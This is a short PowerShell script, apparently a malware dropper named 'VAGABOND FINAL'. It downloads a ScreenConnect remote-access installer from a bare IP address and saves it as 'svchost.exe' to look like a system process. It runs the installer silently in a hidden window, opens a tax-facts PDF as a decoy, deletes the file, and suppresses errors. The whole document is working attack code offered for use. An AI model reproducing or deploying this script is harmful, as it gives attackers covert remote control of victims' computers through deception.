# VAGABOND FINAL - SIMPLE DOWNLOAD & RUN
$scLink = "http://45.66.150.24:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
$pdfLink = "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"

try {
    # 1. Download the ScreenConnect Installer
    $wc = New-Object System.Net.WebClient
    $tempExe = "$env:TEMP\svchost.exe"
    $wc.DownloadFile($scLink, $tempExe)
    
    # 2. Run it silently (this shows the install window)
    Start-Process $tempExe -ArgumentList "/silent" -WindowStyle Hidden
    
    # 3. Wait for it to start installing
    Start-Sleep -Seconds 3
    
    # 4. Open the PDF in the default browser
    Start-Process $pdfLink
    
    # 5. Cleanup
    if (Test-Path $tempExe) { Remove-Item $tempExe }
} catch {
    # Silent failure
}
